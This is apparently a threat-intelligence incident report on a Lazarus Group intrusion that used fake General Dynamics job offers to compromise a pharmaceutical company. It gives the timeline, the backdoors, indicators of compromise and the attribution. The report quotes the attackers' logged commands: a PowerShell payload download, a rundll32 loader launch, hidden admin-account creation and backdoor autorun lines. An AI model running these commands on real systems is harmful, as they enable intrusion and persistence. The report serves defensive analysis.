After starting to analyze the tactics, techniques, and procedures (TTPs) of the attackers, the investigation team found similarities with the Lazarus Group attacks previously described in\n[detail by cybersecurity experts in the reports Operation: Dream Job and \"Operation (노스](https://www.clearskysec.com/wp-content/uploads/2020/08/Dream-Job-Campaign.pdf) [스타) North Star A Job Offer That's Too Good to be True?\".](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-be-true/)\n\nThis article describes a previously unknown attack by the APT group, reveals the Lazarus Group's TTPs that allowed attackers to obtain partial control over a pharmaceutical company's infrastructure in\njust four days, as well as the tools used by the attackers for preliminary compromise, network reconnaissance, and gaining persistence in the infrastructure of the targeted company.\n\nAt the end of the article, PT ESC provides a list of the group's TTPs and indicators of compromise that can be used by cybersecurity specialists to identify traces of the group's attacks and search for\nthreats in their infrastructure.\n\n## 1. Sequence of events\n\nAt the end of September 2020, an employee of the pharmaceutical company received a document named GD2020090939393903.doc with a job offer (creation date: 2020:09:22 03:08:00). After a\nshort period of time, another employee received a document named GD20200909GAB31.doc with a job offer from the same company (creation date: 2020:09:14 07:50:00). By opening the documents\nfrom a potential employer, both victims activated malicious macros on their home computers (see the «Malicious document» section).\n\n\n-----\n\nFigure 1. Malicious document\n\n[In one of the cases, a malicious document was received via Telegram. Note that both documents were received by the victims over the weekend.](https://telegram.org/)\n\n[After running malicious macros on two compromised computers, reconnaissance was performed (T1016: System Network Configuration Discovery) by using system utilities ipconfig.exe, ping.exe, and](https://attack.mitre.org/techniques/T1016/)\nnet.exe. Also the following unknown PE files were launched:\n```\n   C:\\ProgramData\\Applications\\ZCacher.dat ;\n   C:\\ProgramData\\Applications\\MemoryCompressor.tls-lbn ;\n   C:\\ProgramData\\Applications\\MemoryCompressor.tls ;\n   C:\\ProgramData\\Applications\\MemoryCompressor64.exe .\n\n```\nIt was not possible to gain full access to all the files listed above during the incident investigation.\n\nOne of the compromised computers used CommsCacher, a backdoor named ApplicationCacher-f0182c1a4.rb (compilation date: 2020-09-14T16:21:41Z), and its configuration file\nC:\\Users\\*\\AppData\\Local\\.IdentityService\\AccountStore.bak encrypted with the VEST algorithm, as well as the LNK startup file C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\MSSqlite3Svc.lnk. Notably, the backdoor monitors RDP sessions on the compromised computer using WTSEnumerateSessionsW (see the Trojan-Backdoor\nCommsCacher section).\n\nAccording to the proxy server logs, the compromised computers tried to connect to the address forecareer[.]com:443, which was not detected by antivirus engines as malicious at the time of the\nattack. According to WHOIS entries, the domain had been registered a few days before the attack began.\n\n\n-----\n\nFigure 2. Domain data from the VirusTotal resource\n\nFigure 3. Domain registrar data\n\n[At the time of the attack, content was published on the domain that copied a page of the official website of General Dynamics Mission Systems, one of the world's largest manufacturers of military and](https://gdmissionsystems.com/)\n[aerospace equipment. The Lazarus Group had already used this brand in its attacks. The domain also had a valid SSL certificate.](https://twitter.com/issuemakerslab/status/1303284096622239752)\n\n\n-----\n\nFigure 4. SSL certificate parameters\n\n\n-----\n\nFigure 5. Original page of the General Dynamics Mission Systems website\n\n\n-----\n\nFigure 6. Forged page\n\nAt the beginning of the working week, both victims connected to the RDG server of one of the organization's branches from the compromised personal computers. This allowed attackers to gain access\nto the company's corporate network.\n\nOn the same day, the company's RDG server showed traces of illegitimate activity and evidence of malicious reconnaissance on the network for the first time. The compromised accounts, in particular,\nwere used to run system utilities systeminfo.exe, ipconfig.exe, netstat.exe, tasklist.exe, qwinsta.exe, query.exe, quser.exe, net.exe, and ping.exe, as well as C:\\ProgramData\\Comms\\Cacher.hls-iol\n[(version of the public utility ADFind for Active Directory requests).](http://www.joeware.net/freetools/tools/adfind/)\n\n\n-----\n\nLater, CommsCacher with the name C:\\ProgramData\\USOShared\\usomsqlite3.lgs.dat was also installed on the RDG server.\n\nThe attackers also uploaded an unknown PE file with the name C:\\ProgramData\\volitile.dat and launched the DLL library C:\\ProgramData\\comms\\commspkg.bin (compilation date: 2020-0822T18:45:25Z), which executes files transfered in the configuration via the command line using CreateProcessW. The library is protected by VMProtect.\n```\npowershell -Command (New-Object Net.WebClient).DownloadFile('http://192.168.129.92:8080/volitile.ico', 'C:\\ProgramData\\volitile.dat')\ncmd.exe /c cmd.exe /c rundll32.exe c:\\\\programdata\\\\comms\\\\commspkg.bin,Serialize +JHzz8nMxMn+wvv+y/7z+MzCwsjz+MzCwsjPwMSN+/7L\"\n\n```\nTwo days later, after entering the corporate network, the attackers gained access to a number of servers, including the domain controller, additional RDG server, file server, and Crontab server. On\nthese servers, the attackers also performed reconnaissance using system utilities and system services with the name usomgmt. The attackers used this name to name their own services on the\ncompromised hosts:\n```\ncmd.exe /c cmd.exe /c C:\\ProgramData\\Microsoft\\gpolicy.dat -f C:\\ProgramData\\Microsoft\\gpolicy.out C:\\ProgramData\\Microsoft\\gpolicy.bin 1q2w3e4r@#$@#$@#$\ncmd.exe /c cmd.exe /c C:\\ProgramData\\Microsoft\\gpolicy.dat 312 C:\\ProgramData\\Microsoft\\gpolicy.bat\ncmd.exe /c cmd.exe /c net user admin$ abcd1234!@#$ /add\ncmd.exe /c cmd.exe /c net localgroup administrators admin$ /add\ncmd.exe /c cmd.exe /c net localgroup -?-¦-+-+-+-+-?-?-?-¦-?-+-?-? admin$ /add\ncmd.exe /c cmd.exe /c net user admin$ /delete >> C:\\ProgramData\\Microsoft\\gpolicy.out\n\n```\nDuring incident investigation, the experts failed to gain access to files C:\\ProgramData\\Microsoft\\gpolicy.dat, C:\\ProgramData\\Microsoft\\gpolicy.out, C:\\ProgramData\\Microsoft\\gpolicy.bin, and\nC:\\ProgramData\\Microsoft\\gpolicy.bat. Tampering with creation, deletion, and addition of the user admin$ to the administrator group would later provoke the suspicion of the system administrators\nof the compromised company and serve as the beginning of the incident response.\n\n[Similar actions of attackers with the account admin$ were described in the report \"Greetings from Lazarus.\"](https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf)\n\n\n-----\n\nAt the same time, by performing reconnaissance on the computers available, the attackers received new vectors for penetration into the company's corporate network. So, two days later, after the\ncompany's network infrastructure was compromised, another employee from another branch received a job offer. On the social network LinkedIn, the victim was contacted by a user named Rob\nWilson, shortly after which she received an email with a job offer from General Dynamics UK.\n```\nhttps://mail.yandex.ru/?uid=*********#message/***************,Message \"***, please add me to your LinkedIn network!\" — Rob\nWilson — Yandex.Mail,29.09.2020 12:54\nhttps://mail.yandex.ru/?uid==*********#message/***************,Message «Rob sent you a new message» — Rob Wilson via LinkedIn —\nYandex.Mail,29.09.2020 13:30\n\n```\nFigure 7.

Rob Wilson account\n\n[After studying the information about the job and the company through the Yandex search engine, Wikipedia and the legitimate website of General Dynamics UK, the employee continued to correspond](https://yandex.com/)\nwith Rob Wilson's account, from whom they received links to download malicious documents GD20200909GAB31.doc, PDF20200920KLKA.pdf, and PDF20200920KLKA.zip from an attackercontrolled job search website clicktocareers[.]com, which was not detected by antivirus engines as malicious at the time of the attack.\n\nFigure 8. Domain data from the VirusTotal resource\n\nNote that the victim failed to open the received PDF document the first time, after which the attackers sent her the InternalPDFViewer.exe software to view PDF files.\n```\nhttps://generaldynamics.uk.com/,Home - General Dynamics UK,29.09.2020 13:43,2,https://yandex.ru/search/?lr=16&text=%20General%20Dynamics%20UK%20Ltd%20\nhttps://generaldynamics.uk.com/about/about-us/,About us - General Dynamics UK,29.09.2020 13:44\nhttps://generaldynamics.uk.com/work/,Work with us - General Dynamics UK,29.09.2020 13:45\nhttps://generaldynamics.uk.com/work/careers/,Careers - General Dynamics UK,29.09.2020 13:45\nhttps://generaldynamics.uk.com/work/careers/project-management/,Project management - General Dynamics UK,29.09.2020 13:45\nhttps://generaldynamics.uk.com/work/careers/current-vacancies/,Current vacancies - General Dynamics UK,29.09.2020 13:46\n\n```\nThe compromised user also forwarded the malicious email to her colleague.

The experts also discovered the evidence of launching the malicious DLL Trojan-Downloader Agamemnon regid.mdb\n(compilation date: 2020-09-14T16:21:26Z), which is extracted from a malicious document, then collects information from the infected host, sends it to the attackers' server, and in response receives a\n[payload (see the Trojan-Downloader Agamemnon section). Command execution and network reconnaissance on the computer were carried out using the public utility SMBMAP designed for scanning](https://github.com/ShawnDEvans/smbmap)\nSMB services.\n\n## 2.

Examples of LNK files with CommsCacher autorun parameters are shown\nbelow.\n\n\n-----\n\n```\nrundll32.exe CommsCacher.dat,sqlite3_create_functionex dbmanagementservice19253\nrundll32.exe ApplicationCacher-f0182c1a4.rbs,sqlite3_create_functionex sqlite3msdbmgmtsvc-f810a\n\n```\nCommsCacher downloads and uploads configuration data to the hard disk in the file: %localappdata%\\.IdentityService\\AccountStore.bak. The configuration file is encrypted with the VEST encryption\nalgorithm and contains a list of C2 servers. Example of the configuration data:\n```\nhttps://akramportal[.]org/delv/public/voice/voice.php\nhttps://vega.mh-tec[.]jp/.well-known/gallery/siteview.php\nhttps://www.hospitality-partners[.]co.jp/works/performance/consumer.php\nhttps://inovecommerce[.]com.br/public/pdf/view.php\n\n```\nConnecting to one of the C2 servers, the sample receives shellcode and configuration data in response from the C2. The received data is decrypted and the shellcode with the transmitted parameters is\nlaunched. After that, the CommsCacher malware opens a named pipe \\\\.\\pipe\\fb4d1181bb09b484d058768598b, which is used to receive data from the shellcode and then transmit it to the C2\nserver.\n\nThe detected samples C:\\ProgramData\\Applications\\ApplicationCacher-f0182c1a4.rbs (compilation date: 2020-09-24T05:12:24Z) and C:\\ProgramData\\USOShared\\usomsqlite3.lgs.dat (compilation\ndate: 2020-09-29T03:34:06Z) are similar to CommsCacher. The files contain 64 MB of random repeating characters. They could be used by the attackers to bypass antivirus protection that can ignore\nlarge files.\n\n[The backdoor functions and its server side were described in detail in the article Operation North Star: Behind The Scenes.](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/)\n\n## 5. Logs of victims\n\nDuring the incident investigation, a number of malicious C2 servers were identified, and, after studying them, the experts managed to obtain log files with the IP addresses of victims also compromised\nby this group. Log format: [JD = ID][Date] [Victim IP] [User-Agent].\n\nAll identified victims were notified of the incidents. Sensitive information has been replaced with asterisks (*).\n\nFigure 14. Structure of open folders\n\n\n-----\n\nFigure 15. Example of lines from a victim log\n\nThe attacker-controlled servers contained files named sclient+[md5 victim]+.tmp or pagefile+[md5 victim]+.dat. These files contained information from compromised computers.\n\n## 6. Attribution\n\n[The detected indicators of compromise belong to Lazarus Group, a hacker group also known as Hidden Cobra. The group has been operating since 2009 at least. Lazarus is thought to belong to a class](https://attack.mitre.org/groups/G0032)\nof government-sponsored APT groups and come from North Korea. The group regularly conducts its attacks for the purpose of cyberespionage.\n\n[The main source vector of attacks is targeted phishing through third-party resources (Phishing: Spearphishing via Service). In this campaign, attackers, under the guise of the HR service of General](https://attack.mitre.org/techniques/T1566/003)\nDynamics Mission Systems, sent documents with malicious macros containing a stub text with a job offer through LinkedIn, Telegram, WhatsApp, and corporate email.\n\nBelow is an example of correspondence between one of the victims and an attacker in the Telegram messenger. In this case, the attacker offered the victim to do a test assignment on the attackercontrolled server.\n\n\n-----\n\nFigure 16. Example of correspondence with the attacker\n\nTo attack the organization, the attackers created a phishing site of General Dynamics Mission Systems. As C2 servers, they used the resources of allegedly compromised organizations located in Brazil,\nFrance, Japan, South Korea, and the United States.\n\n\n-----\n\n-----\n\nFigure 17. Original and fake version of the GDMS website\n\nThe group is characterized by the use of unique malicious software for remote command execution:\n\n[The detected backdoor CommsCacher indicates a connection with the malicious company Dream Job and identifies the group of attackers as the Lazarus Group.](https://www.clearskysec.com/wp-content/uploads/2020/08/Dream-Job-Campaign.pdf)\nThe document GD2020090939393903.doc obtained during the investigation contains a malicious macro, an encrypted payload, and startup parameters that are stored in Text Box shapes, which\n[coincides with the description of malicious documents that were described in the McAfee report.](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-be-true/)\n\n[The malicious campaign was also reported by researchers from IssueMakersLab:](https://twitter.com/issuemakerslab/status/1303284096622239752?s=20)\n\n\n-----\n\nFigure 18. Chronology of attacks\n\n\n-----\n\n## 7. Conclusions\n\nTo identify all compromised hosts and obtain detailed information about the incident, the experts scanned the entire company's infrastructure for indicators of compromise, as well as network and file\n[signatures of users. All possible host artifacts were also analyzed. The most useful artifacts for restoring the incident chronology were the USN Journal, EVTX Events, Jump Lists, and the MFT table.](https://en.wikipedia.org/wiki/USN_Journal)\n\nThis article describes the TTPs of the Lazarus Group, which allowed them to gain partial control over the infrastructure of the compromised company within four days. This shows a high degree of\npreparedness of attackers and an individual approach to compromising each host on the infrastructure. The attackers used both publicly available software and tools of their own design.\nAccording to the investigation, the attackers did not gain access to sensitive information. As a result of the prompt actions of PT ESC specialists and administrators of the pharmaceutical company, the\nattackers were deprived of access to the controlled infrastructure.\n\n**Author: Aleksandr Grigorian, Positive Technologies**\n\nThe article's author thanks the incident response and threat intelligence teams PT Expert Security Center for their help in drafting the story.\n\n## 8. Similar malicious campaign\n\nAfter investigating the incident, we continued to track the Lazarus Group and identified a new attack that has no direct connection to the case in question, but affects a similar geographical segment.\n\nDuring this attack, in November 2020, attackers used a malicious document (GDLS47129481.docx 994c02f8c721254a959ed9bc823ab94b) with CVE-2017-0199. The attack was allegedly aimed at a\n[company from Russia. The attack was also reported on the Anonymous Security Agency's Twitter account.](https://twitter.com/AnonySecAgency/status/1329635511393140743?s=19)\n\nThe document contained the following stub:\n\n\n-----\n\nFigure 19.
